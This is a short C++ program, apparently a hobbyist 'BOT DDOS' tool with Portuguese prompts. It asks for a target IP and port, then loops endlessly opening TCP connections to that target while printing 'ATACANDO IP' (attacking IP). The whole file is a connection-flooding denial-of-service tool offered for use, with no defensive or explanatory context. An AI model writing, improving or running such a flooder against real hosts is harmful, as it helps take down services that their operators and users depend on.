#include "socket.h"

int main(void)
{
	SetConsoleTitle("BOT DDOS ( BY : SRNAJA )");
	int port;
	char ip[50];
	std::cout << "DIGITE O IP QUE VOCE DESEJA DERRUBAR : \n";
	std::cin >> ip;
	std::cout << "DIGITE A PORTA QUE VOCE DESEJA DERRUBAR : \n";
	std::cin >> port;

	std::system("cls");

	while (true) {
		Socket so(ip, port, 10, SOCK_STREAM, AF_INET, 0);

		so.registerAddr();

		bool t = so.socket_();
		if (!t) {
			std::cout << "problema na criacao do socket!" << std::endl;
			return 0;
		}

		bool f = so.connect_();

		if (!f) {
			std::cout << "problema na conexao" << std::endl;
			return 0;
		}

		std::cout << "\033[1;31mATACANDO IP [" << ip << "] PORT (" << port << ")\n";
	}

	return 0;
}
